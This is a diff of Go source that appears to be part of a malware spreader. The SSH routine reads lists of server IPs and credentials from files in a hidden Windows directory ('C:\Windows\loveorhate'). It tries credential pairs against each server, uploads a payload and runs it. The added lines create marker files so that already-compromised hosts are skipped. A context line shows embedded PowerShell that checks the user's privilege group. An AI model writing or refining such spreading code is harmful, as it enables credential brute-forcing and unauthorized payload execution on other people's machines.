@@ -6,6 +6,7 @@ import (
 	"golang.org/x/crypto/ssh"
 	"io"
 	"os"
+	"path/filepath"
 	"strings"
 
 	"github.com/pkg/sftp"
@@ -41,9 +42,16 @@ if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S
    }
 `
 
+// MarkerFileNameSSH is the marker file name for SSH uploads
+const MarkerFileNameSSH = "upload_marker_ssh.txt"
+
 func SSH() {
+	// Specify the directory path
+	dirPath := "C:\\Windows\\loveorhate"
+
 	// Read SSH server IPs from file
-	ipFile, err := os.Open("sship.txt")
+	ipFilePath := filepath.Join(dirPath, "sship.txt")
+	ipFile, err := os.Open(ipFilePath)
 	if err != nil {
 		fmt.Println("Error reading SSH server IPs file:", err)
 		return
@@ -54,8 +62,15 @@ func SSH() {
 	for scanner.Scan() {
 		sshIP := strings.TrimSpace(scanner.Text())
 
+		// Check if marker file exists
+		if hasMarkerFilen(filepath.Join(dirPath, sshIP)) {
+			fmt.Printf("Skipping %s - Marker file exists\n", sshIP)
+			continue
+		}
+
 		// Read SSH credentials from file
-		credFile, err := os.Open("ssh.txt")
+		credFilePath := filepath.Join(dirPath, "ssh.txt")
+		credFile, err := os.Open(credFilePath)
 		if err != nil {
 			fmt.Println("Error reading SSH credentials file:", err)
 			return
@@ -102,12 +117,30 @@ func SSH() {
 				return
 			}
 
+			// Create marker file to indicate successful upload
+			createMarkerFilen(filepath.Join(dirPath, sshIP))
+
 			// Break out of the credential loop if successful login, upload, and execution
 			break
 		}
 	}
 }
 
+func hasMarkerFilen(dirPath string) bool {
+	markerFilePath := filepath.Join(dirPath, MarkerFileNameSSH)
+	_, err := os.Stat(markerFilePath)
+	return !os.IsNotExist(err)
+}
+
+func createMarkerFilen(dirPath string) error {
+	markerFilePath := filepath.Join(dirPath, MarkerFileNameSSH)
+	file, err := os.Create(markerFilePath)
+	if err != nil {
+		return fmt.Errorf("failed to create marker file: %v", err)
+	}
+	defer file.Close()
+	return nil
+}
 func connectSSH(host string, port int, user, password string) (*ssh.Client, error) {
 	config := &ssh.ClientConfig{
 		User: user,
